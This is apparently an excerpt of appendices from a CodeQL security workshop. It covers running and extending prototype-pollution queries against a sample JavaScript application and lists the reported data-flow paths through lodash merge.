javascript/codeql-js-goof-workshop/workshop.org
** Appendix B: Run default queries
   It's always worthwhile to try the default queries. 
   The CWE-400 [[https://github.com/Semmle/ql/blob/c9e22ab2716b29514435c9691776a73cbb3fe4a5/javascript/ql/test/query-tests/Security/CWE-400/src-vulnerable-lodash/tst.js#L1][tst.js]] has this vulnerability, but it's not found in the test
   code by the queries

   - [[https://github.com/Semmle/ql/blob/86755215ad19e98b7e9490a7205ca4bd436bf1df/javascript/ql/src/Security/CWE-400/PrototypePollution.ql#L21][Security/CWE-400/PrototypePollution.ql]]
     Recursively merging a user-controlled object into another object
     can allow an attacker to modify the built-in Object prototype.

   - [[https://github.com/Semmle/ql/blob/86755215ad19e98b7e9490a7205ca4bd436bf1df/javascript/ql/src/Security/CWE-400/PrototypePollutionUtility.ql#L14][Security/CWE-400/PrototypePollutionUtility.ql]]
     Recursively assigning properties on objects may cause accidental
     modification of a built-in prototype object.

   without some additions as done in [[*Appendix C: Expand existing query with new sources and sinks][Appendix C: Expand existing query with new sources and sinks]].

** Appendix C: Expand existing query with new sources and sinks
   The original query found in [[./PrototypePollution-0.ql]] can be enhanced without
   changing library code by subclassing as is done in [[./PrototypePollution-1.ql]].
   # 
   This finds a good set of results, including the local query's results found
   earlier.

   The results reported by CodeQL:
   - Prototype pollution caused by merging a user-controlled value from here using a
     vulnerable version of lodash.  index.js:272:22

     Path
     | 1 | req              | index.js:259:7  |
     | 2 | req              | index.js:272:22 |
     | 3 | req.body         | index.js:272:22 |
     | 4 | req.body.message | index.js:272:22 |

   - Prototype pollution caused by merging a user-controlled value from here using a
     vulnerable version of just-a-test .  index.js:272:22

     Path
     | 1 | req              | index.js:259:7  |
     | 2 | req              | index.js:272:22 |
     | 3 | req.body         | index.js:272:22 |
     | 4 | req.body.message | index.js:272:22 |

** Appendix D: Further Reading
   The queries provided by the ql library include the following.  They use 
   flow labels and some other advanced concepts that we won't cover during this
   workshop.  They are recommended for separate reading.

   - [[https://github.com/Semmle/ql/blob/86755215ad19e98b7e9490a7205ca4bd436bf1df/javascript/ql/src/Security/CWE-400/PrototypePollution.ql#L21][Security/CWE-400/PrototypePollution.ql]]
   - [[https://github.com/Semmle/ql/blob/86755215ad19e98b7e9490a7205ca4bd436bf1df/javascript/ql/src/Security/CWE-400/PrototypePollutionUtility.ql#L14][Security/CWE-400/PrototypePollutionUtility.ql]]

